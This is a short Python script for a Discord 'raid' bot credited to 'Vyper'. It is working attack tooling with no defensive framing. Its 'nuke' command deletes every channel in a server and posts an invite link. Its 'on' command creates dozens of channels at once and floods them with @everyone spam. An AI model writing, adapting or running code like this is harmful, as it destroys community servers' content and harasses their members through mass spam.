import discord
import asyncio
from discord.ext import commands

intents = discord.Intents.default()
intents.message_content = True

bot = commands.Bot(command_prefix="v", intents=intents)


TOKEN = "" #Poner token aca
print(r"""
                                   _   _                         _____                   
                                  | | | |                       |  __ \                  
                                  | | | |_   _ _ __   ___ _ __  | |  \/_   ___ __   __ _ 
                                  | | | | | | | '_ \ / _ \ '__| | | __\ \ / / '_ \ / _` |
                                  \ \_/ / |_| | |_) |  __/ |    | |_\ \\ V /| | | | (_| |
                                   \___/ \__, | .__/ \___|_|     \____/ \_/ |_| |_|\__, |
                                          __/ | |                                   __/ |
                                         |___/|_|                                  |___/                                                         
                                                                                                """)
print(r"""                                                        Creator: Vyper""")
@bot.command()
async def nuke(ctx):
    tasks = [channel.delete() for channel in ctx.guild.channels]
    await asyncio.gather(*tasks)
    new_channel = await ctx.guild.create_text_channel("raidbyvyper")
    await new_channel.send("Raid-by-vyper https://discord.gg/3euRyfzQbm")
    await ctx.send("Todos los canales fueron eliminados")

@bot.command()
async def on(ctx):
    async def create_channel(nombre, mensaje) :
        for _ in range(20): 
            try:
                new_channel = await ctx.guild.create_text_channel(f"{nombre}")
                for _ in range(mensaje):
                    await new_channel.send("@everyone pwned by vyper https://discord.gg/3euRyfzQbm")
            except Exception as e:
                print(f"Error al crear los canales o enviar el mensaje: {e}")

    await asyncio.gather(*[create_channel("Raid-by-vyper", 20) for i in range(60)])
    

    
bot.run(TOKEN)